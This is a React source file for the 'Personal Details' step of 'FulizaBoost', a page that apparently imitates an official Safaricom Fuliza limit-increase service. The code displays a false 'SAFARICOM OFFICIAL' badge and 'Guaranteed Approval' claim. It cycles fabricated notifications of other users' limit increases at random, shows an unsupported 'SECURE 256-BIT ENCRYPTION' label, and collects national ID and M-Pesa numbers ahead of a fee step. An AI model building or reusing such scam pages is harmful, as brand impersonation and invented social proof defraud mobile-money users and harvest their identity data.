import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import "../styles/PersonalDetails.css";

const notifications = [
  { phone: "0708****85", limit: 45000 },
  { phone: "0712****34", limit: 30000 },
  { phone: "0722****91", limit: 25000 },
  { phone: "0724****56", limit: 35000 },
  { phone: "0745****23", limit: 20000 },
  { phone: "0756****78", limit: 15000 },
  { phone: "0767****12", limit: 40000 },
  { phone: "0700****45", limit: 25000 },
  { phone: "0746****67", limit: 30000 },
  { phone: "0791****89", limit: 45000 },
];

const notificationTimes = [
  { label: "just now", weight: 50 },
  { label: "3 mins ago", weight: 25 },
  { label: "5 mins ago", weight: 15 },
  { label: "6 mins ago", weight: 7 },
  { label: "10 mins ago", weight: 3 },
];

const getRandomTime = () => {
  const totalWeight = notificationTimes.reduce((sum, t) => sum + t.weight, 0);
  let rand = Math.random() * totalWeight;
  for (const t of notificationTimes) {
    if (rand < t.weight) return t.label;
    rand -= t.weight;
  }
  return "just now";
};

const PersonalDetails = () => {
  const navigate = useNavigate();
  const { state } = useLocation();

  const [limitData, setLimitData] = useState<{ amount: number; fee: number } | null>(null);
  const [currentNotification, setCurrentNotification] = useState({
    ...notifications[0],
    time: "just now",
  });
  const [idNumber, setIdNumber] = useState("");
  const [phone, setPhone] = useState("");
  const [loading, setLoading] = useState(false);
  const [tickerKey, setTickerKey] = useState(0); // triggers animation

  useEffect(() => {
    if (state?.amount && state?.fee) {
      setLimitData({ amount: state.amount, fee: state.fee });
      sessionStorage.setItem(
        "selectedLimit",
        JSON.stringify({ amount: state.amount, fee: state.fee })
      );
    } else {
      const storedLimit = JSON.parse(sessionStorage.getItem("selectedLimit") || "null");
      if (storedLimit) setLimitData(storedLimit);
    }
  }, [state]);

  useEffect(() => {
    const interval = setInterval(() => {
      const randomIndex = Math.floor(Math.random() * notifications.length);
      setCurrentNotification({
        ...notifications[randomIndex],
        time: getRandomTime(),
      });
      setTickerKey(prev => prev + 1);
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  const isIdValid = /^\d{6,10}$/.test(idNumber);
  const isPhoneValid = /^(0?[71]\d{8})$/.test(phone);
  const isFormValid = isIdValid && isPhoneValid && !loading && limitData !== null;

  const handleVerify = () => {
    if (!isFormValid || !limitData) return;
    setLoading(true);
    try {
      navigate("/confirmation", {
        state: {
          limit: limitData.amount,
          fee: limitData.fee,
          phone: `+254${phone}`,
          username: idNumber,
          identificationNumber: idNumber,
        },
      });
    } catch (error) {
      console.error(error);
      alert("Something went wrong. Please try again.");
    } finally {
      setLoading(false);
    }
  };

  if (!limitData) return <p className="loading-text">Loading...</p>;

  return (
    <main className="pd-container">
      <div className="pd-header">
        <button className="back-btn" onClick={() => navigate(-1)}>←</button>
        <span className="header-title">Personal Details</span>
      </div>

      <div className="pd-brand">
        <div className="badge">● SAFARICOM OFFICIAL</div>
        <h1 className="title">FulizaBoost</h1>
        <p className="subtitle">Instant Limit Increase • Guaranteed Approval</p>
      </div>

     <div className="notification-overlay ticker">
  <div
    key={tickerKey} // triggers new animation
    className="ticker-content"
  >
    <div className="notification-icon">⚡</div>
    <div className="notification-content">
  <strong>{currentNotification.phone}</strong> increased to Ksh{" "}
  {currentNotification.limit.toLocaleString()}
  <span className="notification-time"> • {currentNotification.time}</span>
</div>
  </div>
</div>

      <hr />

      <h2 className="identify-title">Identify Yourself</h2>
      <p className="identify-text">
        This information is required to verify your eligibility for the limit increase.
      </p>

      <div className="form-group">
        <label>National ID Number</label>
        <input
          type="text"
          placeholder="Enter ID Number"
          value={idNumber}
          onChange={(e) => setIdNumber(e.target.value)}
          autoFocus
        />
        {!isIdValid && idNumber && <span className="error-text">Enter a valid ID number</span>}
      </div>

      <div className="form-group">
        <label>M-Pesa Registered Number</label>
        <div className="phone-input">
          <span className="prefix">+254</span>
          <input
            type="text"
            placeholder="07xx xxx xxx"
            value={phone}
            onChange={(e) => setPhone(e.target.value.replace(/\D/g, ""))}
          />
        </div>
        {!isPhoneValid && phone && <span className="error-text">Enter a valid Safaricom number</span>}
      </div>

      <div className="pd-footer">
        <button
          className={`verify-btn ${isFormValid ? "enabled" : ""}`}
          onClick={handleVerify}
          disabled={!isFormValid}
        >
          {loading ? <span className="spinner" /> : "Verify & Continue"}
        </button>
        <p className="secure-text">SECURE 256-BIT ENCRYPTION</p>
      </div>
    </main>
  );
};

export default PersonalDetails;